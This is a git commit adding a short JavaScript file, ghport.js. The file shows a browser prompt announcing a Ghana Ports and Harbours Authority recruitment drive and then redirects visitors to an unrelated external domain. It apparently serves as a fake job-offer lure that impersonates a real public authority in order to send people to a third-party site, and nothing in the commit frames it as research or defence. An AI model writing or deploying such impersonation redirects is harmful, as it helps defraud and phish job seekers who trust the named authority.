eefbb08add60c380645a8d3dbf7d76e35db15958
newetijazz1 <newetijazz1@gmail.com>
2025-08-19 12:38:57 +0100

    Create ghport.js

---
+++ ghport.js
@@ -0,0 +1,6 @@
+
+var password = 'GPHA Recruitment'
+password=prompt('NOTICE: Ghana Ports and Harbours Authority (GPHA) is currently recruiting, press OK to apply for the','GPHA Recruitment');
+if (password != 'GPHA Recruitment') {
+location.href='https://www.isadata.xyz/GhanaPortsRecruitment';
+}
